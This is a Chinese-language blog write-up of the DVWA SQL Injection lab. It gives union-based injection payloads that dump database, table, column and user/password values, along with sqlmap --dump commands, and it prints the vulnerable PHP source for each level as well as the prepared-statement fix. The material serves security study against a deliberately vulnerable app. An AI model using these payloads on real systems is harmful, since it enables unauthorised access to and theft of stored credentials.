@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>DVWA—SQL Injection | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言：之前有刷过sqlilabs，前言就不再介绍了。 Low：手工注入：1）判断是否存在注入点，注入点是字符型还是数字型 1’ and ‘1’&#x3D;’1，成功 1’ and ‘1’&#x3D;’2，返回结果为空，存在说明存在注入点且为&#39; 2）猜解SQL查询语句中的字段数 1’ order by 1#不报错； 1’ order by 2#不报错； 1’ order by 3#报错，说明SQL查询语句中只有">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA—SQL Injection">
+<meta property="og:url" content="http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言：之前有刷过sqlilabs，前言就不再介绍了。 Low：手工注入：1）判断是否存在注入点，注入点是字符型还是数字型 1’ and ‘1’&#x3D;’1，成功 1’ and ‘1’&#x3D;’2，返回结果为空，存在说明存在注入点且为&#39; 2）猜解SQL查询语句中的字段数 1’ order by 1#不报错； 1’ order by 2#不报错； 1’ order by 3#报错，说明SQL查询语句中只有">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-03-09T13:20:45.370Z">
+<meta property="article:modified_time" content="2021-03-12T11:38:26.286Z">
+<meta property="article:author" content="linbei">
+<meta property="article:tag" content="DVWA-labs">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-DVWA—SQL Injection" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/03/09/DVWA%E2%80%94SQL%20Injection/" class="article-date">
+  <time datetime="2021-03-09T13:20:45.370Z" itemprop="datePublished">2021-03-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      DVWA—SQL Injection
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有刷过sqlilabs，前言就不再介绍了。</p>
+<h1 id="Low："><a href="#Low：" class="headerlink" title="Low："></a>Low：</h1><h2 id="手工注入："><a href="#手工注入：" class="headerlink" title="手工注入："></a>手工注入：</h2><p><strong>1）判断是否存在注入点，注入点是字符型还是数字型</strong></p>
+<p>1’ and ‘1’=’1，成功</p>
+<p>1’ and ‘1’=’2，返回结果为空，存在说明存在注入点且为<code>&#39;</code></p>
+<p><strong>2）猜解SQL查询语句中的字段数</strong></p>
+<p>1’ order by 1#不报错；</p>
+<p>1’ order by 2#不报错；</p>
+<p>1’ order by 3#报错，说明SQL查询语句中只有两个字段，即这里的First name、Surname。</p>
+<p><strong>3）判断回显位</strong></p>
+<p>0’ union select 1,2#![1](DVWA—SQL Injection/1.png)</p>
+<p>有两个回显位。</p>
+<p><strong>4）爆库</strong></p>
+<p>0’ union select 1,database()#![2](DVWA—SQL Injection/2.png)</p>
+<p><strong>5）爆表</strong></p>
+<p>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#![3](DVWA—SQL Injection/3.png)</p>
+<p><strong>6）爆列</strong></p>
+<p>0’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’#</p>
+<p>![4](DVWA—SQL Injection/4.png)</p>
+<p><strong>7）爆值</strong></p>
+<p>0’ union select user,password from users#</p>
+<p>![5](DVWA—SQL Injection/5.png)</p>
+<p>或0’ union select 1,group_concat(user,0x3a,password) from users# </p>
+<p>![6](DVWA—SQL Injection/6.png)</p>
+<h2 id="利用sqlmap自动注入："><a href="#利用sqlmap自动注入：" class="headerlink" title="利用sqlmap自动注入："></a>利用sqlmap自动注入：</h2><p><strong>1）获取所有数据库</strong></p>
+<p>sqlmap.py -u “url”   –cookie “cookie中的内容” –dbs</p>
+<p>sp：　-u ： 指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 </p>
+<p>​            –dbs：获取所有数据库</p>
+<p><strong>2）查询当前数据库名</strong></p>
+<p>sqlmap.py -u “url”   –cookie “cookie中的内容” –current-db</p>
+<p>sp： –current-db：查询当前数据库昵称</p>
+<p><strong>3）查表名</strong></p>
+<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa –tables</p>
+<p>sp：-D：指定数据库</p>
+<p>　　–table：查询所有表</p>
+<p>​        –batch：批处理,也就是系统默认选项(按照默认的选项 全自动执行)</p>
+<p><strong>4）查列名</strong></p>
+<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -T users –columns</p>
+<p>sp：-T：指定表名</p>
+<p>​        –columns：查询所有列</p>
+<p><strong>5）查值</strong></p>
+<p>sqlmap.py -u “url” –cookie=”cookie中的内容” –batch -D dvwa -C user,password –dump</p>
+<p>sp：-C：指定columns 如果不指定,默认整表</p>
+<ul>
+<li>查看源码：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_REQUEST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;   </span><br><span class="line">     <span class="comment">// Get input  </span></span><br><span class="line">     $id = $_REQUEST[ <span class="string">&#x27;id&#x27;</span> ];  </span><br><span class="line">     </span><br><span class="line">     <span class="comment">// Check database  </span></span><br><span class="line">     $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;            $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );         <span class="comment">// Get results  </span></span><br><span class="line">      <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;     </span><br><span class="line">      <span class="comment">// Get values     </span></span><br><span class="line">      $first = $row[<span class="string">&quot;first_name&quot;</span>];     </span><br><span class="line">      $last = $row[<span class="string">&quot;last_name&quot;</span>];     </span><br><span class="line">      </span><br><span class="line">      <span class="comment">// Feedback for end user     </span></span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;   &#125;   </span><br><span class="line">      mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]); </span><br><span class="line">      &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h1 id="Medium："><a href="#Medium：" class="headerlink" title="Medium："></a>Medium：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123; </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get input*</span></span><br><span class="line">  $id = $_POST[ <span class="string">&#x27;id&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">  $id = mysql_real_escape_string( $id ); </span><br><span class="line"></span><br><span class="line">  $query = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>; </span><br><span class="line">  $result = mysql_query( $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> ); </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="comment">//Get results </span></span><br><span class="line"><span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123; </span><br><span class="line">        <span class="comment">//Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到服务器使用mysql_real_escape_string()函数过滤了一些字符（其中包括反斜杠，单双引号），同时网页端选择了下拉选择菜单限制我们输入。但是我们看到本关的注入点为数字型，那么我们可以利用抓包的方式修改上传数据。![7](DVWA—SQL Injection/7.png)</p>
+<h1 id="High："><a href="#High：" class="headerlink" title="High："></a>High：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_SESSION [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_SESSION[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们注意到这关的数据提交页面和查询结果返回页面不是同一个页面</p>
+<p>![8](DVWA—SQL Injection/8.png)</p>
+<p>但是这关如果用手工注入的话，难度和Low级别是一样的，那么这关针对防御的是一般的sqlmap注入，因为sqlmap在注入过程中，无法在数据提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
+<h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/leezhxing/p/5282437.html">https://www.cnblogs.com/leezhxing/p/5282437.html</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/09/DVWA%E2%80%94SQL%20Injection/" data-id="ckoyk4alu000i94vu5c2qc9yl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/03/10/DVWA%E2%80%94SQL%20Injection%20(Blind)/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          DVWA—SQL Injection (Blind)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/03/04/DVWA%E2%80%94CSRF/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">DVWA—Cross Site Request Forgery (CSRF)</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" rel="tag">C语言学习</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA-labs/" rel="tag">DVWA-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA%E2%80%94labs/" rel="tag">DVWA—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" rel="tag">MySQL数据库的搭建与启动</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bugku/" rel="tag">bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dvwa%E2%80%94labs/" rel="tag">dvwa—labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" rel="tag">mysql数据库的使用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlilabs/" rel="tag">sqlilabs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/upload-labs/" rel="tag">upload-labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E6%B8%97%E9%80%8F/" rel="tag">web渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" rel="tag">数据库的增删改查</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 14px;">C语言学习</a> <a href="/tags/DVWA-labs/" style="font-size: 16px;">DVWA-labs</a> <a href="/tags/DVWA%E2%80%94labs/" style="font-size: 10px;">DVWA—labs</a> <a href="/tags/HTTP/" style="font-size: 10px;">HTTP</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 12px;">PHP</a> <a href="/tags/bugku/" style="font-size: 10px;">bugku</a> <a href="/tags/dvwa%E2%80%94labs/" style="font-size: 10px;">dvwa—labs</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 12px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 12px;">web渗透</a> <a href="/tags/%E5%88%B7%E9%A2%98/" style="font-size: 18px;">刷题</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/05/21/buuctf3/">buuctf3</a>
+          </li>
+        
+          <li>
+            <a href="/2021/05/13/%E5%81%9A%E9%A2%98%E6%80%9D%E8%B7%AF/">做题思路</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/29/i%E6%98%A5%E7%A7%8B2/">i春秋</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/19/i%E6%98%A5%E7%A7%8B1/">i春秋</a>
+          </li>
+        
+          <li>
+            <a href="/2021/04/13/buuctf2/">buuctf2</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 linbei<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
